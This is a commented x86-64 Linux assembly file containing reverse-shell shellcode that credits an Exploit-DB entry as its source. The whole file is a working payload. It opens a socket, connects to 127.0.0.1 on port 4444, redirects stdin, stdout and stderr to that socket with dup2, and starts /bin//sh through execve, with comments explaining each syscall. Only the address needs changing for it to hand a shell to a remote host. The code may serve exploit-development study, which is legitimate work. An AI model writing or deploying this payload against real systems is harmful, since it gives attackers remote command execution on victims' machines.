;Based on Touhid M.Shaikh's shellcode 
;https://www.exploit-db.com/exploits/42485/
;For syscalls  check:
;http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
;Syscall number is stored in rax for x64 arch
;You can use strace to study syscalls
global _start
 
 
_start:
;sys_socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
xor rax,rax
add rax, 41; syscall number 41
xor rdi,rdi
mov rdx, rdi; IPPROTO_IP = 0
add rdi, 2; AF_INET =2
xor rsi,rsi
add rsi, 1;SOCK_STREAM = 1
syscall

;sys_connect(socket_fd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, addr_len)
;Here addr_len = 16
mov rdi, rax;socket file descriptor moved to rdi
xor rax, rax
push rax
add rax,0x2
;Create structure {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}
mov dword [rsp-4],0x0100007f ; 127.0.0.1 little endian
mov word [rsp-6], 0x5c11;4444 littlen endian
mov word [rsp-8], ax ; Move 0x2 to rsp-8 (This is AF_INET value)
sub rsp, 8 ; rsp Now points to begining of structure
add rax, 40;rax is now 40 + 2 = 42 (syscall connect)
mov rsi, rsp ; rsi is the first argument of the syscall
xor rdx,rdx
add rdx, 16; addr_len = 16
syscall


;The three dup2 calls are meant to redirect stdin,stdout and stderr to the socket

;sys_dup2(oldfd,newfd) = dup2(3,0)
;http://man7.org/linux/man-pages/man2/dup.2.html or man dup
;dup2 duplicates a fd
;This call duplicates the socket fd stored in rdi into rsi.
xor rax,rax
mov rsi, rax;New fd set to 0
add rax, 33;syscall 33 = sys_dup2
syscall

;sys_dup2(oldfd,newfd) = dup2(3,1)
xor rax,rax
add rax, 33;syscall 33  = sys_dup2
xor rsi,rsi
add rsi, 1;New fd set to 1
syscall


;sys_dup2(oldfd,newfd) = dup2(3,2)
;This can be deleted to make shellcode smaller (you don't really need stderr if there is no err!)
xor rax, rax
add rax, 33
xor rsi,rsi
add rsi, 2
syscall


;sys_execve("/bin//sh", ["/bin//sh"], [/* 0 vars */])
xor rax, rax
push rax;Push 0 to stack
mov rbx, 0x68732f2f6e69622f; /bin//sh (little endian)
push rbx;push string to stack
mov rdi, rsp;rdi is first argument: string "/bin//sh"
push rax;Push 0 to stack
mov rdx, rsp;third argument : 0
push rdi;Push adress to /bin//sh to stack (pointer)
mov rsi, rsp;rsi is second argument: argv[]: here it's a pointer to "/bin//sh" string
add rax, 59;sycall 59 = sys_execve
syscall
 
